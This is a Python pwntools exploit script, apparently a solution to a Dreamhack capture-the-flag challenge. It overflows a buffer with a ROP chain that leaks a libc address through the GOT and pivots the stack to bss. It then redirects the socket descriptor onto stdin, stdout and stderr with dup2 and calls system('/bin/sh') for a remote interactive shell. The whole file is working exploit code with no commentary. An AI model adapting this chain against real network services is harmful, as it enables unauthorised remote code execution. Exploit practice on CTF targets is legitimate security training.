#!/usr/bin/env python3
from pwn import *

PORT = 16968
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

pop_rdi = 0x401399
pop_rcx_rdx_rsi_rdi = 0x401396
pop_rdx_rsi_rdi = 0x401397
pop_rsi_rdi = 0x401398
pop_rbp = 0x40137d
bss = 0x404e00
leave_ret = 0x4016ca

stage1 = b'/quit\x00'.ljust(0x348, b'A')
stage1 += flat(
    pop_rcx_rdx_rsi_rdi,
    0, 8, elf.got.puts, 4,
    elf.plt.send
)

stage1 += flat(
    pop_rcx_rdx_rsi_rdi,
    0, 0x180, bss, 4,
    elf.plt.read
)

stage1 += flat(
    pop_rbp,
    0x404e00,
    leave_ret
)

sa(b'\n', stage1)
libc.address = u64(p.recvn(8)) - libc.sym.puts
log.info(f'libc: {hex(libc.address)}')

FD = 4

binsh = next(libc.search(b'/bin/sh\x00'))

stage2 = p64(0) 

for fd in (0, 1, 2):
    stage2 += flat(
        pop_rcx_rdx_rsi_rdi,
        0, 0, fd, FD,
        libc.sym.dup2
    )

# system("/bin/sh")
stage2 += flat(
    pop_rcx_rdx_rsi_rdi,
    0, 0, 0, binsh,
    libc.sym.system
)

p.send(stage2)
sleep(0.2)

p.interactive()